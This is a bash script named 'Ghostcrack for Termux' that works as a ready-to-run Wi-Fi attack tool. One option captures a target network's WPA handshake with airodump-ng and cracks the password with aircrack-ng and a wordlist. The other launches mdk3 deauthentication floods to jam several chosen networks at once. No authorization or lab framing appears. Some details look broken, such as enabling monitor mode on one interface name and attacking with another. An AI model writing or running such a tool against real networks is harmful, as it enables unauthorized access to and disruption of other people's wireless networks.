#!/bin/bash

# Colors Used
Red="\e[1;91m"
Green="\e[0;92m"
Yellow="\e[0;93m"
Blue="\e[1;94m"
White="\e[0;97m"

handshakeWait=2  # Time for aircrack-ng to wait for handshake in minutes
wifiInterface="wlan0"  # Change if necessary based on your device
wifiInterfaceMon="${wifiInterface}mon"

checkDependencies() {
    echo -e "${Blue}[Checking Dependencies]${White}"
    required=(aircrack-ng termux-api mdk3)
    for dep in "${required[@]}"; do
        if ! command -v "$dep" > /dev/null 2>&1; then
            echo -e "${Red}[Missing]${White} $dep not found. Install it using: pkg install $dep"
            missing=1
        fi
    done
    if [ "$missing" == 1 ]; then
        echo -e "${Red}[Error]${White} Please install the missing dependencies and re-run the script."
        exit 1
    fi
    echo -e "${Green}[OK]${White} All dependencies are installed."
}

checkTermux() {
    if [ -z "$PREFIX" ]; then
        echo -e "${Red}[Error]${White} This script is designed to run in Termux. Please ensure you are using Termux."
        exit 1
    fi
}

banner() {
    echo -e "${Green}====================================="
    echo -e "      Ghostcrack for Termux"
    echo -e "${Green}====================================="
}

setupMonitorMode() {
    echo -e "${Yellow}[Setting Up Monitor Mode]${White}"
    ifconfig $wifiInterface down
    iwconfig $wifiInterface mode monitor
    ifconfig $wifiInterface up
    echo -e "${Green}[OK]${White} Monitor mode enabled on $wifiInterface."
}

cleanupMonitorMode() {
    echo -e "${Yellow}[Cleaning Up Monitor Mode]${White}"
    ifconfig $wifiInterface down
    iwconfig $wifiInterface mode managed
    ifconfig $wifiInterface up
    echo -e "${Green}[OK]${White} Managed mode restored on $wifiInterface."
}

performAttack() {
    echo -e "${Yellow}[Starting Handshake Capture]${White}"
    read -p "${Blue}Enter the target BSSID: ${White}" bssid
    read -p "${Blue}Enter the channel: ${White}" channel
    echo -e "${Green}[Info]${White} BSSID: $bssid, Channel: $channel"

    # Start airodump-ng to capture handshake
    airodump-ng --bssid "$bssid" --channel "$channel" --write handshake $wifiInterfaceMon &
    airodump_pid=$!
    echo -e "${Yellow}[Waiting for Handshake]${White} Waiting $handshakeWait minutes..."
    sleep $((handshakeWait * 60))

    # Stop airodump-ng after waiting
    kill "$airodump_pid"
    echo -e "${Green}[Handshake Capture Complete]${White}"

    # Run aircrack-ng to attempt password cracking
    read -p "${Blue}Enter the path to your wordlist: ${White}" wordlist
    if [ ! -f "handshake-01.cap" ]; then
        echo -e "${Red}[Error]${White} Handshake file not found. Ensure airodump-ng captured the handshake."
        exit 1
    fi

    echo -e "${Yellow}[Starting Aircrack-ng]${White}"
    aircrack-ng -w "$wordlist" -b "$bssid" handshake-01.cap
    echo -e "${Green}[Attack Complete]${White}"
}

performDeauthAttack() {
    echo -e "${Yellow}[Starting Deauthentication Attack]${White}"
    read -p "${Blue}Enter the target BSSIDs (comma-separated): ${White}" bssids
    read -p "${Blue}Enter the channel(s): ${White}" channels

    # Convert inputs to arrays
    IFS=',' read -r -a bssidArray <<< "$bssids"
    IFS=',' read -r -a channelArray <<< "$channels"

    for index in "${!bssidArray[@]}"; do
        bssid=${bssidArray[$index]}
        channel=${channelArray[$index]}
        echo -e "${Yellow}[Jamming]${White} BSSID: $bssid on Channel: $channel"

        # Use mdk3 to jam devices on the specified BSSID and channel
        mdk3 $wifiInterfaceMon d -b <(echo "$bssid") -c "$channel" &
        mdk3_pids+=("$!")
    done

    echo -e "${Yellow}[Deauth Attack Running]${White} Press any key to stop..."
    read -n 1

    # Stop all mdk3 processes
    for pid in "${mdk3_pids[@]}"; do
        kill "$pid"
    done
    echo -e "${Green}[Deauth Attack Stopped]${White}"
}

main() {
    checkTermux
    checkDependencies
    banner
    echo -e "${Yellow}[Starting Attack Sequence]${White}"
    setupMonitorMode

    echo -e "${Blue}Choose an option:${White}"
    echo -e "1. Perform handshake capture and cracking"
    echo -e "2. Perform deauthentication attack (jam multiple devices)"
    read -p "${Blue}Enter your choice (1/2): ${White}" choice

    case $choice in
        1)
            performAttack
            ;;
        2)
            performDeauthAttack
            ;;
        *)
            echo -e "${Red}[Error]${White} Invalid choice. Exiting."
            ;;
    esac

    cleanupMonitorMode
    echo -e "${Green}[Done]${White} Script completed."
}

main
